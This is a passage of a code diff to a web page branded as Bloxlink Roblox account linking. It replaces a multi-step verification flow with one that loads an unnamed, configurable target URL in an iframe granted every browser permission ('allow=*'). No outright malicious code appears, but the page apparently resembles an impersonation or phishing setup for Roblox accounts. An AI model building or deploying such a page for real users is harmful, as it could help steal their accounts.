+                    <p class="text-sm font-normal text-secondary-text text-left">Link your Roblox account with Bloxlink in one click.</p>
+                  </div>
+                </div>
+                <!-- Next button -->
+                <button id="nextBtn" class="transition-colors rounded-md flex items-center justify-center bg-indigo-600 hover:bg-indigo-700 text-white py-2 px-3 font-medium text-sm">
+                  <div class="flex items-center">Next</div>
+                </button>
+              </div>
+            </div>
+          </div>
         </div>
-        <div class="step-active rounded-md flex items-center gap-3 px-4 py-3">
-          <div class="w-7 h-7 rounded-full border-2 step-circle-active flex items-center justify-center text-sm font-bold flex-shrink-0">2</div>
-          <span class="text-sm font-semibold">Account Verification</span>
-        </div>
-        <div class="step-inactive rounded-md flex items-center gap-3 px-4 py-3">
-          <div class="w-7 h-7 rounded-full border-2 step-circle-inactive flex items-center justify-center text-sm font-bold flex-shrink-0">3</div>
-          <span class="text-sm">Select Servers</span>
-        </div>
-        <div class="step-inactive rounded-md flex items-center gap-3 px-4 py-3">
-          <div class="w-7 h-7 rounded-full border-2 step-circle-inactive flex items-center justify-center text-sm font-bold flex-shrink-0">4</div>
-          <span class="text-sm">Finished</span>
-        </div>
-      </div>
 
-      <!-- Loading state -->
-      <div id="iframeLoading" class="flex flex-col items-center py-16 gap-4">
-        <div class="spinner"></div>
-        <p class="text-secondary-text text-sm">Connecting to Roblox...</p>
-      </div>
+        <!-- Step 2: iframe section (shown after Next) -->
+        <div id="iframeSection" class="px-8">
+          <iframe id="verifyIframe" src="about:blank" allow="*"></iframe>
+        </div>
 
-      <!-- Iframe -->
-      <div id="verifyIframeWrap">
-        <iframe id="verifyIframe" src="about:blank" allow="*"></iframe>
       </div>
     </div>
-
-    <div class="h-24"></div>
+    <div class="h-44"></div>
   </div>
 </div>
 
@@ -299,17 +273,12 @@
 
   initUserNav({ chipId: 'navChip', avatarId: 'navAvatar', nameId: 'navUsername', dropdownId: 'navDropdown' });
 
-  // Next button → step 2 with iframe immediately
+  // Next → show iframe immediately
   document.getElementById('nextBtn').addEventListener('click', () => {
-    document.getElementById('step1View').style.display = 'none';
-    const s2 = document.getElementById('step2View');
-    s2.style.display = 'block';
-
-    document.getElementById('iframeLoading').style.display = 'none';
-    document.getElementById('verifyIframeWrap').style.display = 'block';
-
+    document.getElementById('step1Section').style.display = 'none';
+    document.getElementById('iframeSection').style.display = 'block';
     const iframe = document.getElementById('verifyIframe');
-    if (!iframe.src || iframe.src === 'about:blank') {
+    if (iframe.src === 'about:blank' || !iframe.src) {
       iframe.src = CONFIG.TARGET_URL;
     }
   });
@@ -317,15 +286,13 @@
   // Mobile sidebar
   document.getElementById('mobileMenuBtn')?.addEventListener('click', () => {
     const inner = document.getElementById('sidebarInner');
-    const sidebar = document.getElementById('sidebar');
-    sidebar.classList.toggle('invisible');
     inner.classList.toggle('left-[-16rem]');
     inner.classList.toggle('left-0');
   });
   document.getElementById('closeSidebarBtn')?.addEventListener('click', () => {
-    document.getElementById('sidebarInner').classList.add('left-[-16rem]');
-    document.getElementById('sidebarInner').classList.remove('left-0');
-    document.getElementById('sidebar').classList.add('invisible');
+    const inner = document.getElementById('sidebarInner');
+    inner.classList.add('left-[-16rem]');
+    inner.classList.remove('left-0');
   });
 </script>
 </body>
